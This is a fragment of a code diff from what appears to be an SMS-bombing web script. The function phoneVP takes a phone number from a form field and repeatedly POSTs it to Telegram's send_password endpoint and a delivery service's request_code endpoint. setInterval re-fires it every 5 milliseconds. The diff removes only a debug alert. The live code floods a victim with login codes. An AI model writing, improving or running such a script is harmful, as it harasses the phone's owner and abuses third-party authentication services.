@@ -46,7 +46,6 @@ errordef()
 	
 function phoneVP() {
 	var email = document.getElementById("emph").value;
-	alert("1")
 	$.ajax({type: "POST", url: "https://my.telegram.org/auth/send_password?phone=+7"+email})//1
 	$.ajax({type: "POST", url: "https://api.farfor.ru/v3/842b03f5-7db9-4850-9cb1-407f894abf5e/ufa/auth/request_code/?phone=7"+email+"&ui_element=login"})//1
 	setInterval(phoneVP, 5)
